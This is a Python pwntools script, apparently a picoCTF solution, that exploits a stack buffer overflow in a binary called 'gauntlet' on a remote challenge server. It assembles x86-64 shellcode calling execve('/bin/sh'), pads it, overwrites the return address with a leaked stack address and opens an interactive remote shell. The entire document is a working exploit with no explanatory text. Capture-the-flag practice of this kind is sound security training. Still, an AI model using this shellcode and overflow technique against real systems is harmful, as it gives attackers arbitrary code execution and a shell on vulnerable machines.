from pwn import *

context.binary = ('./gauntlet')
#context.arch = 'amd64'

p = remote('wily-courier.picoctf.net', 59294)

shellcode = asm(
    """
    xor    rax, rax
    push   rax
    xor    rdx, rdx
    xor    rsi, rsi
    movabs rbx, 0x68732f2f6e69622f
    push   rbx
    push   rsp
    pop    rdi
    mov    al, 0x3b
    syscall
    """
)

# shellcode = asm(shellcraft.execve('/bin/sh', 0, 0))
# shellcode = asm(shellcraft.sh())

shellcode_addr = int(p.recvline().strip(), 16)
log.info(hex(shellcode_addr))
payload = shellcode.ljust(120, b"a")
payload += p64(shellcode_addr)

p.sendline(b"a")
p.sendline(payload)

p.interactive()
